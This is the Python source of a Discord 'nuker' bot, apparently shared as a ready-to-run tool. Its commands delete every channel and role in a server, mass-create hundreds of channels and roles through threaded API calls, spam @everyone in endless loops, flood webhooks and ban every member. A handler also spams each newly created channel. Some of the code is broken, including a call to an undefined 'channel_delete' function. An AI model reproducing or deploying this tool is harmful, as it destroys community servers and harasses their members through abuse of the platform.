import sys, discord, requests, json, threading, random, asyncio,aiohttp, time, os, socket, time
from discord.ext import commands
import colorama
from colorama import Fore, Style, Back, Fore
from termcolor import colored
from time import sleep
from datetime import datetime
from pystyle import Colorate, Colors


session = requests.Session()

login ="""
                          ██╗░░░░░░█████╗░░██████╗░░██████╗░██╗███╗░░██╗
                          ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██║████╗░██║
                          ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░██║██╔██╗██║
                          ██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██║██║╚████║
                          ███████╗╚█████╔╝╚██████╔╝╚██████╔╝██║██║░╚███║
                          ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚═╝╚═╝░░╚══╝
"""

print(Colorate.Vertical(Colors.yellow_to_red, login))
print(f'''{Fore.WHITE}
                        ╭━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━╮
                        ╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯''')
print('')
tokenstyle = """
                                    ▀█▀ █▀█ █▄▀ █▀▀ █▄░█
                                    ░█░ █▄█ █░█ ██▄ █░▀█
"""

print(Colorate.Vertical(Colors.yellow_to_red, tokenstyle))
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
token = input("                            [?] Bot Token: ")
print(f'''{Fore.YELLOW}
                                    █▀█ █▀█ █▀▀ █▀▀ █ ▀▄▀
                                    █▀▀ █▀▄ ██▄ █▀░ █ █░█''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
prefix = input("                            [?] what you want the prefix to be: ")
print(f'''{Fore.YELLOW} 
                                    █▀ ▀█▀ ▄▀█ ▀█▀ █░█ █▀
                                    ▄█ ░█░ █▀█ ░█░ █▄█ ▄█''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
stats = input("                            [?] Status: ")
print(f'''{Fore.YELLOW}
                                █▀▀ █░█ ▄▀█ █▄░█   █▄░█ ▄▀█ █▀▄▀█ █▀▀
                                █▄▄ █▀█ █▀█ █░▀█   █░▀█ █▀█ █░▀░█ ██▄''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
chan = input("                            [?] Channel Name: ")
print(f'''{Fore.YELLOW}
                                        ▀█▀ █▀▀ ▀▄▀ ▀█▀
                                        ░█░ ██▄ █░█ ░█░''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
spamdata = input("                            [?] Spam content: ")
print(f'''{Fore.YELLOW}
                                        █▀█ █▀█ █░░ █▀▀ █▀
                                        █▀▄ █▄█ █▄▄ ██▄ ▄█''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
rol = input("                            [?] role name: ")
print(f'''{Fore.YELLOW}
                                        █▄░█ ▄▀█ █▀▄▀█ █▀▀
                                        █░▀█ █▀█ █░▀░█ ██▄''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
tag = input("                            [?] whats your discord tag?: ")
print(f'''{Fore.YELLOW}
                                  █░█░█ █▀▀ █▄▄ █░█ █▀█ █▀█ █▄▀
                                  ▀▄▀▄▀ ██▄ █▄█ █▀█ █▄█ █▄█ █░█''')
print(f'''{Fore.WHITE}''')
print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
webname = input("                            [?] Spam Webhook names: ")
amountss = 1000
intents = discord.Intents().all()
intents.messages = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")
print(f"{Fore.WHITE}")
os.system('cls' if os.name == 'nt' else 'clear')


if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }
  

@bot.event
async def on_ready():
    print('')
    await bot.change_presence(activity=discord.Game(stats))
    print(f"{Fore.LIGHTRED_EX}")
    print(f"{Fore.YELLOW}")
sun = """
                             ____                                __             
                            / __/ __ __  ___        ___  __ __  / /__ ___   ____
                            _\ \  / // / / _ \     / _ \/ // / /  '_// -_) / __/
                           /___/  \_,_/ /_//_/    /_//_/\_,_/ /_/\_\ \__/ /_/   𝘷 1.1
"""
print(Colorate.Vertical(Colors.yellow_to_red, sun))
def animated_print2(text, delay=0.1):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
animated_print2(f"{Fore.WHITE}                                        ᴄᴏᴍᴍᴀɴᴅs ғᴏʀ ᴛʜᴇ ʙᴏᴛ  ")
print(f'''{Fore.BLACK}''')
blabla = """                                ╔══════════════════════════════════╗
                                ║   [1] Nuke   ║   [5] scr         ║
                                ║   [2] scc    ║   [6] spam        ║
                                ║   [3] sdc    ║   [7] bm          ║
                                ║   [4] sdr    ║   [9] end         ║
                                ║   [8] swh    ║   [10] CN         ║
                                ╚══════════════════════════════════╝"""
print(Colorate.Vertical(Colors.yellow_to_red , blabla))
print(f"{Fore.WHITE}                                         ᴘʀᴇғɪx - [{prefix}] ❘  ⲏⲓ - {tag} ")
def animated_print(text, delay=0.1):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

animated_print("                                          ᴍᴀᴅᴇ ʙʏ ANONYMOUS")




@bot.command()
async def scc(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def spc(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/channels",
           headers=headers,
           json=json
        )
    for i in range(500):
           threading.Thread(
             target=spc,
             args=(chan, )
           ).start()
           
@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name="LAMOOO")

    for channel in ctx.guild.channels:
        await channel.delete()
        print("Deleted {}".format(channel))

    for i in range(50):
        await ctx.guild.create_text_channel(f"SUNBOT")

    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            while True:
                await channel.send("@everyone SUN BOT>>>>>>>")

@bot.command()
async def scr(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def scrr(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/roles",
           headers=headers,
           json=json
        )
    for i in range(250):
           threading.Thread(
             target=scrr,
             args=(chan, )
           ).start()

@bot.command()
async def sdr(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        await role.delete()

@bot.command()
async def Cn(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        await channel.delete()
    def cc(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json
        )
    for i in range(250):
           for channel in list(ctx.guild.channels):   
               threading.Thread(
                    target=channel_delete,
                    args=(channel.id, )
               ).start()
    for i in range(250):
           threading.Thread(
             target=cc,
             args=(chan, )
           ).start()

@bot.command()
async def sdc(ctx):
    for channel in list(ctx.guild.channels):
        await channel.delete()
          
@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    amountspam = 1000
    for i in range(amountspam):
        for channel in ctx.guild.channels:
            await channel.send(spamdata)

@bot.command()
async def swh(ctx):
    await ctx.message.delete()
    amountspam = 10000
    for i in range(amountspam):
        for webhook in ctx.guild.webhooks:
            await webhook.send(spamdata)
            
@bot.command()
async def mb(ctx):
  try:
    for members in ctx.guild.members:
      await members.ban(reason="Nuked By anon")
      print(Fore.GREEN + f"banned {members}")
  except:
    print(Fore.RED + f"cant ban {members}")

@bot.event
async def on_guild_channel_create(channel):
        try:
            webhook = await channel.create_webhook(name=webname)
            for i in range(10000):   
                 await webhook.send(spamdata)
        except:
            print("[!] Ratelimited :( ║")
            
@bot.command()
async def info(ctx, user: discord.User):
    user_info = f"""
# ----------------------------------
# Information about {user.name}
# ----------------------------------
**Username**: {user.name}
**User ID**: {user.id}
**Discriminator**: #{user.discriminator}
**Bot Account?**: {user.bot}
**Joined Discord On**: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
**Avatar URL**: [.]({user.avatar.url})

Note: Server join date and some other info may not be available.
"""
    await ctx.send(user_info)
            
@bot.command()
async def end(ctx):
    # Ask for confirmation in the terminal
    (f'''{Fore.WHITE}                 ─────────────────────────────────''')
    print(f'''{Fore.YELLOW}
                        █▀ █░█ █░█ ▀█▀ █▀▄ █▀█ █░█░█ █▄░█
                        ▄█ █▀█ █▄█ ░█░ █▄▀ █▄█ ▀▄▀▄▀ █░▀█''')
    ('')
    print(f'{Fore.WHITE}')
    confirmation = input("[?] Aʀᴇ ʏᴏᴜ sᴜʀᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sʜᴜᴛ ᴅᴏᴡɴ ᴛʜᴇ ʙᴏᴛ? (ʏ/ɴ): ").strip().lower()
    if confirmation == 'y':
        shutdown_message = await ctx.send("Bot is shutting down.")
        await bot.close() 
        await shutdown_message.delete() 
        sys.exit()  
    else:
        shutdown_cancel_message = await ctx.send("Shutdown canceled.")
        await shutdown_cancel_message.delete() 
        

        
bot.run(token)
